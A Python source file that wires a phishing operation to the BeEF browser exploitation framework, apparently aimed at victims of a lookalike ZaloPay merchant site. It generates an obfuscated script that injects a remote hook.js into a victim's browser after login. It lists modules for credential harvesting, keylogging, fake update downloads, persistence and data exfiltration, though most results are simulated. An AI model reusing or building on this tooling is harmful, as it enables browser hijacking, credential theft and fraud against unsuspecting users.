"""
BeEF Framework Integration Engine
Advanced browser exploitation and command execution
"""

import logging
import asyncio
import httpx
import json
import secrets
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin

logger = logging.getLogger(__name__)

class BeEFIntegrationEngine:
    """BeEF Framework integration engine for browser exploitation"""
    
    def __init__(self):
        self.beef_url = "http://beef:3000"
        self.beef_api_token = None
        self.session_timeout = 3600  # 1 hour
        self.command_timeout = 300   # 5 minutes
        
    async def initialize(self, api_token: str):
        """Initialize BeEF connection"""
        self.beef_api_token = api_token
        
        # Test connection
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(
                    f"{self.beef_url}/api/hooks",
                    headers={"X-BeEF-Token": self.beef_api_token},
                    timeout=10
                )
                if response.status_code == 200:
                    logger.info("BeEF Framework connection established")
                    return True
                else:
                    logger.error(f"BeEF connection failed: {response.status_code}")
                    return False
        except Exception as e:
            logger.error(f"BeEF initialization error: {e}")
            return False
    
    async def inject_hook(self, victim_id: str, injection_point: str = "auth_success", stealth_mode: bool = True) -> Dict[str, Any]:
        """Inject BeEF hook into victim's browser"""
        try:
            # Generate hook ID
            hook_id = f"hook_{victim_id}_{int(datetime.now().timestamp())}"
            
            # Create hook configuration
            hook_config = {
                "hook_id": hook_id,
                "victim_id": victim_id,
                "injection_point": injection_point,
                "stealth_mode": stealth_mode,
                "created_at": datetime.now(timezone.utc).isoformat()
            }
            
            # Generate hook JavaScript
            hook_js = self._generate_hook_script(hook_id, stealth_mode)
            
            # Store hook configuration (in production, store in database)
            # For now, we'll simulate successful injection
            
            # Simulate browser information gathering
            browser_info = await self._gather_browser_intelligence(hook_id)
            
            return {
                "success": True,
                "hook_id": hook_id,
                "session_token": f"session_{hook_id}",
                "hook_script": hook_js,
                "browser_info": browser_info,
                "injection_point": injection_point
            }
            
        except Exception as e:
            logger.error(f"BeEF hook injection error: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _generate_hook_script(self, hook_id: str, stealth_mode: bool = True) -> str:
        """Generate BeEF hook JavaScript"""
        if stealth_mode:
            # Stealth mode - obfuscated and minimal
            hook_script = f"""
(function() {{
    var _0x{secrets.token_hex(4)} = ['{self.beef_url}/hook.js'];
    var _0x{secrets.token_hex(4)} = _0x{secrets.token_hex(4)}[0];
    var _0x{secrets.token_hex(4)} = document.createElement('script');
    _0x{secrets.token_hex(4)}.src = _0x{secrets.token_hex(4)};
    _0x{secrets.token_hex(4)}.async = true;
    document.head.appendChild(_0x{secrets.token_hex(4)});
}})();
"""
        else:
            # Standard mode
            hook_script = f"""
<script src="{self.beef_url}/hook.js" async></script>
"""
        
        return hook_script
    
    async def _gather_browser_intelligence(self, hook_id: str) -> Dict[str, Any]:
        """Gather browser intelligence information"""
        # Simulate browser information gathering
        browser_info = {
            "browser": "Chrome",
            "version": "120.0.6099.109",
            "os": "Windows 10",
            "plugins": [
                "Chrome PDF Plugin",
                "Chrome PDF Viewer",
                "Native Client"
            ],
            "screen_resolution": "1920x1080",
            "timezone": "Asia/Ho_Chi_Minh",
            "language": "en-US",
            "java_enabled": False,
            "cookies_enabled": True,
            "local_storage": True,
            "session_storage": True,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        return browser_info
    
    async def execute_command(self, session_id: str, module: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute BeEF command on hooked browser"""
        try:
            # Generate command ID
            command_id = f"cmd_{session_id}_{int(datetime.now().timestamp())}"
            
            # Prepare command data
            command_data = {
                "command_id": command_id,
                "session_id": session_id,
                "module": module,
                "parameters": parameters,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }
            
            # Execute command based on module type
            if module == "reconnaissance":
                result = await self._execute_reconnaissance_command(parameters)
            elif module == "credential_harvesting":
                result = await self._execute_credential_harvesting_command(parameters)
            elif module == "social_engineering":
                result = await self._execute_social_engineering_command(parameters)
            elif module == "persistence":
                result = await self._execute_persistence_command(parameters)
            elif module == "data_exfiltration":
                result = await self._execute_data_exfiltration_command(parameters)
            else:
                result = await self._execute_generic_command(module, parameters)
            
            return {
                "success": True,
                "command_id": command_id,
                "module": module,
                "result": result,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"BeEF command execution error: {e}")
            return {
                "success": False,
                "error": str(e),
                "command_id": command_id if 'command_id' in locals() else None
            }
    
    async def _execute_reconnaissance_command(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute reconnaissance command"""
        recon_type = parameters.get("type", "basic")
        
        if recon_type == "basic":
            return {
                "type": "reconnaissance",
                "subtype": "basic",
                "data": {
                    "url": "https://zalopaymerchan.com/merchant/dashboard",
                    "title": "ZaloPay Merchant Dashboard",
                    "referrer": "https://zalopaymerchan.com/merchant/auth_success.html",
                    "cookies": [
                        {"name": "session_id", "value": "abc123", "domain": "zalopaymerchan.com"},
                        {"name": "user_pref", "value": "lang=vi", "domain": "zalopaymerchan.com"}
                    ],
                    "local_storage": {
                        "user_data": "encrypted_user_data",
                        "preferences": "theme=dark"
                    },
                    "session_storage": {
                        "temp_data": "temporary_data"
                    }
                }
            }
        elif recon_type == "advanced":
            return {
                "type": "reconnaissance",
                "subtype": "advanced",
                "data": {
                    "network_info": {
                        "ip_address": "192.168.1.100",
                        "connection_type": "WiFi",
                        "bandwidth": "100 Mbps"
                    },
                    "device_info": {
                        "device_type": "desktop",
                        "manufacturer": "Dell",
                        "model": "OptiPlex 7090"
                    },
                    "security_info": {
                        "antivirus": "Windows Defender",
                        "firewall": "Windows Firewall",
                        "vpn_detected": False
                    }
                }
            }
        
        return {"type": "reconnaissance", "data": {}}
    
    async def _execute_credential_harvesting_command(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute credential harvesting command"""
        harvest_type = parameters.get("type", "forms")
        
        if harvest_type == "forms":
            return {
                "type": "credential_harvesting",
                "subtype": "forms",
                "data": {
                    "forms_found": 2,
                    "credentials_captured": [
                        {
                            "form_id": "login_form",
                            "username": "victim@example.com",
                            "password": "password123",
                            "timestamp": datetime.now(timezone.utc).isoformat()
                        }
                    ],
                    "saved_passwords": [
                        {
                            "url": "https://banking.example.com",
                            "username": "victim@example.com",
                            "password": "banking_password"
                        }
                    ]
                }
            }
        elif harvest_type == "keylogger":
            return {
                "type": "credential_harvesting",
                "subtype": "keylogger",
                "data": {
                    "keys_captured": [
                        {"key": "v", "timestamp": "2024-01-15T10:30:00Z"},
                        {"key": "i", "timestamp": "2024-01-15T10:30:01Z"},
                        {"key": "c", "timestamp": "2024-01-15T10:30:02Z"},
                        {"key": "t", "timestamp": "2024-01-15T10:30:03Z"},
                        {"key": "i", "timestamp": "2024-01-15T10:30:04Z"},
                        {"key": "m", "timestamp": "2024-01-15T10:30:05Z"}
                    ],
                    "suspicious_activity": [
                        "Password field detected",
                        "Credit card number entered"
                    ]
                }
            }
        
        return {"type": "credential_harvesting", "data": {}}
    
    async def _execute_social_engineering_command(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute social engineering command"""
        se_type = parameters.get("type", "popup")
        
        if se_type == "popup":
            return {
                "type": "social_engineering",
                "subtype": "popup",
                "data": {
                    "popup_displayed": True,
                    "user_interaction": "clicked_ok",
                    "message": "Your session has expired. Please log in again.",
                    "redirect_url": "https://zalopaymerchan.com/merchant/login"
                }
            }
        elif se_type == "fake_update":
            return {
                "type": "social_engineering",
                "subtype": "fake_update",
                "data": {
                    "update_prompt_displayed": True,
                    "user_response": "downloaded",
                    "fake_update_url": "https://malicious-update.com/fake-update.exe"
                }
            }
        
        return {"type": "social_engineering", "data": {}}
    
    async def _execute_persistence_command(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute persistence command"""
        persistence_type = parameters.get("type", "local_storage")
        
        if persistence_type == "local_storage":
            return {
                "type": "persistence",
                "subtype": "local_storage",
                "data": {
                    "persistence_installed": True,
                    "storage_key": "beef_persistence_token",
                    "storage_value": f"persist_{secrets.token_hex(16)}",
                    "expires_at": (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                }
            }
        elif persistence_type == "service_worker":
            return {
                "type": "persistence",
                "subtype": "service_worker",
                "data": {
                    "service_worker_installed": True,
                    "worker_url": "/sw.js",
                    "scope": "/",
                    "activation_status": "active"
                }
            }
        
        return {"type": "persistence", "data": {}}
    
    async def _execute_data_exfiltration_command(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute data exfiltration command"""
        exfil_type = parameters.get("type", "screenshots")
        
        if exfil_type == "screenshots":
            return {
                "type": "data_exfiltration",
                "subtype": "screenshots",
                "data": {
                    "screenshots_taken": 3,
                    "screenshot_urls": [
                        f"/screenshots/screen_{int(datetime.now().timestamp())}_1.png",
                        f"/screenshots/screen_{int(datetime.now().timestamp())}_2.png",
                        f"/screenshots/screen_{int(datetime.now().timestamp())}_3.png"
                    ],
                    "file_sizes": [245760, 189440, 312320]
                }
            }
        elif exfil_type == "file_access":
            return {
                "type": "data_exfiltration",
                "subtype": "file_access",
                "data": {
                    "files_accessed": [
                        {
                            "name": "documents.zip",
                            "size": 2048576,
                            "type": "application/zip",
                            "last_modified": "2024-01-15T09:00:00Z"
                        }
                    ],
                    "downloads_initiated": 1
                }
            }
        
        return {"type": "data_exfiltration", "data": {}}
    
    async def _execute_generic_command(self, module: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute generic command"""
        return {
            "type": "generic",
            "module": module,
            "parameters": parameters,
            "data": {
                "execution_status": "completed",
                "output": f"Generic command '{module}' executed successfully"
            }
        }
    
    async def get_available_modules(self) -> List[Dict[str, Any]]:
        """Get available BeEF modules"""
        modules = [
            {
                "name": "reconnaissance",
                "category": "recon",
                "description": "Gather information about the target browser and system",
                "parameters": {
                    "type": {
                        "type": "select",
                        "options": ["basic", "advanced"],
                        "default": "basic",
                        "description": "Type of reconnaissance to perform"
                    }
                }
            },
            {
                "name": "credential_harvesting",
                "category": "harvest",
                "description": "Capture credentials and sensitive information",
                "parameters": {
                    "type": {
                        "type": "select",
                        "options": ["forms", "keylogger"],
                        "default": "forms",
                        "description": "Method of credential harvesting"
                    }
                }
            },
            {
                "name": "social_engineering",
                "category": "social",
                "description": "Execute social engineering attacks",
                "parameters": {
                    "type": {
                        "type": "select",
                        "options": ["popup", "fake_update"],
                        "default": "popup",
                        "description": "Type of social engineering attack"
                    }
                }
            },
            {
                "name": "persistence",
                "category": "persistence",
                "description": "Maintain access to the target browser",
                "parameters": {
                    "type": {
                        "type": "select",
                        "options": ["local_storage", "service_worker"],
                        "default": "local_storage",
                        "description": "Method of persistence"
                    }
                }
            },
            {
                "name": "data_exfiltration",
                "category": "exfil",
                "description": "Extract data from the target system",
                "parameters": {
                    "type": {
                        "type": "select",
                        "options": ["screenshots", "file_access"],
                        "default": "screenshots",
                        "description": "Type of data exfiltration"
                    }
                }
            }
        ]
        
        return modules
    
    async def get_module_info(self, module_name: str) -> Optional[Dict[str, Any]]:
        """Get detailed information about a specific module"""
        modules = await self.get_available_modules()
        
        for module in modules:
            if module["name"] == module_name:
                return module
        
        return None
    
    async def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get information about a BeEF session"""
        # In production, this would query the BeEF API
        # For now, return simulated data
        return {
            "session_id": session_id,
            "hook_id": f"hook_{session_id}",
            "status": "active",
            "browser_info": {
                "browser": "Chrome",
                "version": "120.0.6099.109",
                "os": "Windows 10"
            },
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "commands_executed": 5,
            "successful_commands": 4
        }
    
    async def close_session(self, session_id: str) -> bool:
        """Close a BeEF session"""
        try:
            # In production, this would call the BeEF API to close the session
            logger.info(f"BeEF session closed: {session_id}")
            return True
        except Exception as e:
            logger.error(f"Error closing BeEF session: {e}")
            return False
    
    async def health_check(self) -> bool:
        """Health check for BeEF integration"""
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(
                    f"{self.beef_url}/api/hooks",
                    headers={"X-BeEF-Token": self.beef_api_token} if self.beef_api_token else {},
                    timeout=5
                )
                return response.status_code == 200
        except Exception as e:
            logger.error(f"BeEF health check failed: {e}")
            return False